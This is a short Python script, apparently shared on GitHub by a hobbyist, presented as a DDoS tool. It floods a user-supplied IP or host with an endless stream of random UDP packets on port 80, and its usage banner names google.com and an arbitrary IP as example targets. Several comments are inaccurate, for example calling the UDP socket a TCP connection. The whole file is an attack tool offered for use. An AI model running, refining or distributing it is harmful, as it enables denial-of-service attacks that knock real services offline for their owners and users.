#!/usr/bin/python3
# Coder By ALi2004h
# Github : github.com/ali2004-linux
# Version Python All Versions

import socket
import os
import sys
from colorama import Fore

try: os.system ("clear && clear")
except: os.system ("cls && cls")
def banner():
    b = """
        \t    _    _ _ ____   ___   ___  _  _   _     
        \t   / \  | (_)___ \ / _ \ / _ \| || | | |__  
        \t  / _ \ | | | __) | | | | | | | || |_| '_ \ 
        \t / ___ \| | |/ __/| |_| | |_| |__   _| | | |
        \t/_/   \_\_|_|_____|\___/ \___/   |_| |_| |_|                                    
    """
    print(b)
    print("\n\t\t Github : https://Github.com/Ali2004-linux\n\t\t Gmail : ALi2004h.linux@gmail.com")
    print("\n\tUsage : python ddos.py http://target.com or Enter Ip Site!")
    print("\n\tExmple : python ddos.py http://google.com or python3 ddos.py 192.10.133.10")
    print("\t\t!!==>> Port Default in 80 If Edit Code for Your Port <==!!")
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #tcp connect
    c = os.urandom(1000) #create a text 1000 charet
    try:
        ip = sys.argv[1]
        f = 0
        try:
            while(True):
                s.sendto(c, (ip,int(80)))
                f +=  1
                print(Fore.GREEN+"[*] Sending Packet To %s Count[%d]! "%(ip,f))
        except socket.gaierror:
            print(Fore.RED+"\n \t [*] Plaese Connect To Internet!! or address site not found\n")

    except IndexError:
        banner()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()
        print("BY")
